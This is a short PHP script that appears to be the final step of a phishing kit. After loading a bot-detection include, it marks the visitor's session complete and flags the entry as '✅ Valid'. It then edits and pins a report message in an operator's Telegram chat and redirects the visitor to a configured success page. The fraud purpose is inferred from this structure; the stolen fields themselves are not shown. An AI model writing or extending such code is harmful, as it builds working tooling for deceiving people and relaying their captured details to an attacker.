<?php 
session_start();
ob_start();
// ini_set('display_errors', '1');
// ini_set('display_startup_errors', '1');
// error_reporting(E_ALL);

require_once(__DIR__ . '/../includes/php/detect.php');
require_once(__DIR__ . '/../includes/php/config.php');


if(!isset($_SESSION['complete'])){
   $_SESSION['complete'] = true;

   require_once(__DIR__ . '/../includes/php/bot_api.php');

   $activity['status'] = '🔴';
   $activity['step'] = '✅ Valid';
   
   include(__DIR__ . '/../includes/php/texts.php');
   
   // Explicit empty inline keyboard removes buttons (session no longer drives this via bot_api).
   $status1 = bot_api('editMessageText', $message, ['inline_keyboard' => []]);
   $status2 = bot_api('pinChatMessage', $message, '');

   if (!bot_api_telegram_ok($status1)) {
      error_log('[complete] editMessageText failed: ' . json_encode($status1));
      die('{"error":true, "description": "telegram bot api"}');
   }

   if (!bot_api_telegram_ok($status2)) {
      error_log('[complete] pinChatMessage failed: ' . json_encode($status2));
   }

    header('Location: ' . $config['redirect_url_success']);
    exit();
}



?>